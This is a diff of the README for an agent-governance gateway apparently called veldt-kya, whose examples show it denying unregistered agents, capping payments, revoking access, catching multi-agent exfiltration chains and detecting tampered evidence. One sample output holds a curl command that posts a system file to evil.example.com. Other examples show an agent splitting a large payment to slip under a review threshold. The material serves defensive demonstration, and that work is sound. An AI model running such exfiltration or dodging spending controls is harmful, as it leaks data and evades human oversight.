@@ -19,12 +19,12 @@ Agent / agent framework
 ```
 
 ```bash
-pip install "veldt-kya[gateway]"
+pip install "veldt-kya[gateway,attack_chains]"
 ```
 
 Every output block below is produced by
-[`examples/quickstart`](examples/quickstart) — `python run.py` reproduces
-all six on your machine.
+[`examples/quickstart`](https://github.com/veldtlabs/veldt-kya/blob/main/examples/quickstart) — `python run.py` reproduces
+them on your machine.
 
 ---
 
@@ -36,7 +36,7 @@ all six on your machine.
 | **Contain** | Revoke an agent's authority mid-flight. The next call is denied. |
 | **Attribute** | Every agent has a cryptographic identity it must prove per request. |
 | **Correlate** | Catch multi-agent attacks — steps that are benign alone and malicious only in sequence. |
-| **Delegate** | Flag or block a sub-agent that exceeds the authority of the parent that spawned it. |
+| **Delegate** | Detect a sub-agent that exceeds the authority of the parent that spawned it, and flag or block it once you enable enforcement. |
 | **Prove** | Hash-chained evidence that shows when a record was altered. |
 
 ---
@@ -47,14 +47,14 @@ Send an unregistered agent through the gateway. It is denied — and it still
 appears in your inventory, by identity.
 
 ```
-did:key:z6MkrJVnaZkeFzdQ...  ->  403
-did:key:z6MkpTHR8VNsBxYA...  ->  403
+did:key:z6MkrJVnaZkeFzdQyMZu...  ->  403
+did:key:z6MkpTHR8VNsBxYAAWHu...  ->  403
 ```
 
 ```
 agents now visible (neither was registered):
-  kya-b3560c98…   did:key:z6MkpTHR8VNsBxYA…   1 call
-  kya-d652dd10…   did:key:z6MkrJVnaZkeFzdQ…   1 call
+  kya-d652dd109873...   did:key:z6MkrJVnaZkeFzdQyMZu1c...
+  kya-b3560c981ed2...   did:key:z6MkpTHR8VNsBxYAAWHut2...
 ```
 
 Discovery comes from traffic, not from an onboarding form. You see the agents
@@ -96,16 +96,17 @@ kya.register_evaluator("payment-controls", PaymentControls())
 `approved_today()` sums this agent's own allowed transfers straight out of
 KYA's evidence — the gateway already records every verdict with its tool
 arguments and the agent's identity. Full helper in
-[`examples/quickstart/payment_controls.py`](examples/quickstart/payment_controls.py).
+[`examples/quickstart/payment_controls.py`](https://github.com/veldtlabs/veldt-kya/blob/main/examples/quickstart/payment_controls.py).
 
 ```
 $   250  ->  200  executed
 $ 5,000  ->  428  flag_for_review          <- too big to auto-approve
-$   900  ->  200  executed                    the agent splits it up
+$   900  ->  200  executed               <- the agent splits it up
 $   900  ->  200  executed
 $   900  ->  403  deny (daily_cap_exceeded) <- the day's budget is spent
 
-actually executed by the payment service:  250, 900, 900
+executed by the payment service: 250, 900, 900
+asked for $7,950, moved $2,050
 ```
 
 The agent asked to move **$7,950**. It moved **$2,050**. The per-payment limit
@@ -138,8 +139,8 @@ kya.register_evaluator("exfil-blocker", ExfilBlocker())
 ```
 
 ```
-echo hello                            ->  200  executed
-curl https://evil.example.com -d @…   ->  403  deny (exfil_shaped_argument)
+echo hello                                  ->  200  executed
+curl https://evil.example.com -d @/etc/p    ->  403  deny (exfil_shaped_argument)
 
 calls the upstream tool received: 1
 ```
@@ -163,9 +164,9 @@ db.commit()
 ```
 
 ```
-granted     ->  executed
-REVOKED     ->  deny (RBAC_GRANT_DENIED)
-reinstated  ->  executed
+granted       ->  200  executed
+REVOKED       ->  403  deny (MIN_TRUST_NOT_MET, RBAC_GRANT_DENIED)
+reinstated    ->  200  executed
 ```
 
 Requires `KYA_RBAC_ENFORCEMENT=block`.
@@ -194,14 +195,20 @@ steps:
 ```
 
 ```
-BEFORE   recon agent -> executed      exfil agent -> executed
-         chain fired: cross_agent_data_exfiltration
-AFTER    recon agent -> deny          exfil agent -> deny
+BEFORE the chain:
+  recon agent   ->  200  executed
+  exfil agent   ->  200  executed
+
+chain fired: ['cross_agent_data_exfiltration']
+
+AFTER the chain:
+  recon agent   ->  403  deny (MIN_TRUST_NOT_MET, RBAC_GRANT_DENIED)
+  exfil agent   ->  403  deny (MIN_TRUST_NOT_MET, RBAC_GRANT_DENIED)
 ```
 
 Every participating agent loses trust — not just the agent that completed the
-chain — so the orchestrator itself can be contained rather than simply
-retrying through another child.
+chain — so the parent that spawned them can be contained too, when it is
+itself a governed principal.
 
 Rules ship with the package:
 
@@ -233,7 +240,7 @@ Anyone holding the verification key can detect whether recorded evidence was
 altered. Editing a record breaks verification and identifies the row.
 
 ```bash
-export KYA_EVIDENCE_SIGNING_KEY=...   # without it the chain cannot be verified
+export KYA_EVIDENCE_SIGNING_KEY=$(openssl rand -base64 32)   # must be base64
 ```
 
 ```python
@@ -245,9 +252,9 @@ kya.verify_chain(db, tenant_id="acme", invocation_id=invocation_id)
 ```
 
 ```
-verified    : {'valid': True,  'broken_at': None, 'checked': 3}
-after tamper: {'valid': False, 'broken_at': 1,
-               'reason': 'payload_hash mismatch — payload was modified'}
+verified    : valid=True checked=2
+after tamper: valid=False broken_at=33
+              payload_hash mismatch — payload was modified
 ```
 
 Someone edited the amount from 5000 to 50 directly in the database. The chain
@@ -260,7 +267,7 @@ names the row. An auditor does not have to trust your word, or ours.
 Every agent proves the cryptographic identity attached to the request;
 authority is evaluated separately. Generate an identity in code —
 the private key never leaves the process and there is nothing to paste into a
-config file. See [`examples/quickstart/agent_identity.py`](examples/quickstart/agent_identity.py).
+config file. See [`examples/quickstart/agent_identity.py`](https://github.com/veldtlabs/veldt-kya/blob/main/examples/quickstart/agent_identity.py).
 
 ```python
 from agent_identity import new_agent_identity, proof
@@ -299,7 +306,7 @@ Everything above runs on the Apache-2.0 package. KYA Pro adds:
 
 | | |
 |---|---|
-| **Richer enforcement** | `throttle`, `redact` and `anonymize` alongside allow / deny / hold. |
+| **Richer enforcement** | `throttle`, `redact` and `anonymize` alongside allow / deny / flag_for_review. |
 | **Declarative policy** | Attribute rules without writing a custom evaluator. |
 | **Lineage containment** | Contain a principal and propagate containment through the delegation branch. |
 | **Operational control plane** | Fleet inventory, live verdicts, policy operations, and evidence workflows for auditors. |
